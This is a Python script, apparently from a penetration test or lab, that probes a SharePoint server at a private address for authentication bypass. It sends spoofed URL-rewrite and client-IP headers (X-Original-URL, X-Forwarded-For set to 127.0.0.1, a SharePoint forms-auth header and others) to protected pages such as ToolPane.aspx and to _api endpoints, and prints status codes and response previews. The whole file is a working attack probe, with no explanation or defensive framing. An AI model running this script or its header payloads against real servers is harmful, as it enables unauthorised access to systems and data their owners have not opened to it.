# Purpose: Test URL rewrite header authentication bypasses
# Outcome: Check if v2 SharePoint validates URL rewrite headers

import requests

target_base = "http://10.10.10.166"

# URL rewrite/override headers commonly used for bypasses
headers_to_test = [
    {"X-Rewrite-URL": "/_layouts/15/ToolPane.aspx"},
    {"X-Original-URL": "/_layouts/15/ToolPane.aspx"},
    {"X-Forwarded-Path": "/_layouts/15/ToolPane.aspx"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-Host": "localhost"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-FORMS_BASED_AUTH_ACCEPTED": "t"},  # SharePoint specific
    {"X-MS-ASPNETCORE-TOKEN": "internal"},  # Microsoft specific
    {"X-RequestDigest": "0x1234"},  # SharePoint form digest
]

# Test accessing protected endpoint via URL rewrite
test_targets = [
    "/",  # Root with rewrite to protected path
    "/_layouts/15/AccessDenied.aspx",  # Access denied page
    "/_layouts/15/error.aspx",  # Error page
    "/_vti_bin/",  # VTI bin root
]

print("[*] Testing URL rewrite/override header bypasses...")

for extra_headers in headers_to_test:
    header_name = list(extra_headers.keys())[0]
    print(f"\n[*] Testing header: {header_name}")
    
    for target in test_targets[:2]:
        try:
            headers = {
                "Accept": "*/*",
                **extra_headers
            }
            r = requests.get(f"{target_base}{target}", headers=headers, timeout=10, allow_redirects=False)
            print(f"    {target}: {r.status_code}")
            if r.status_code == 200 and len(r.text) > 50:
                print(f"        Preview: {r.text[:100]}")
        except Exception as e:
            print(f"    {target}: Error - {e}")

# Test specifically against API endpoints with these headers
print("\n[*] Testing header bypasses on API endpoints...")
api_endpoints = ["/_api/web/currentuser", "/_api/web/title", "/_api/contextinfo"]

for extra_headers in headers_to_test[:5]:
    header_name = list(extra_headers.keys())[0]
    for endpoint in api_endpoints[:1]:
        try:
            headers = {
                "Accept": "application/json",
                **extra_headers
            }
            r = requests.get(f"{target_base}{endpoint}", headers=headers, timeout=10, allow_redirects=False)
            print(f"    {header_name} -> {endpoint}: {r.status_code}")
        except Exception as e:
            print(f"    {header_name}: Error - {e}")

print("\n[*] URL rewrite bypass test complete")
